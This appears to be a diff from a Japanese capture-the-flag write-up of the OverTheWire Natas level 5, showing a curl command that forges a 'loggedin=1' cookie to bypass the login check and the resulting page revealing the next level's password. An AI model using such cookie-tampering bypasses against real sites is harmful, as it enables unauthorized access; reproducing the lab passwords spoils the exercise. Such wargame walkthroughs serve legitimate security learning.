@@ -61,3 +61,22 @@ $ curl -u natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq \
        -b loggedin=1 \
           http://natas5.natas.labs.overthewire.org
 ```
+```html
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas5", "pass": "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq" };</script></head>
+<body>
+<h1>natas5</h1>
+<div id="content">
+Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
+</body>
+</html>
+```
+これでpassword(`aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1`)を得ることができました。
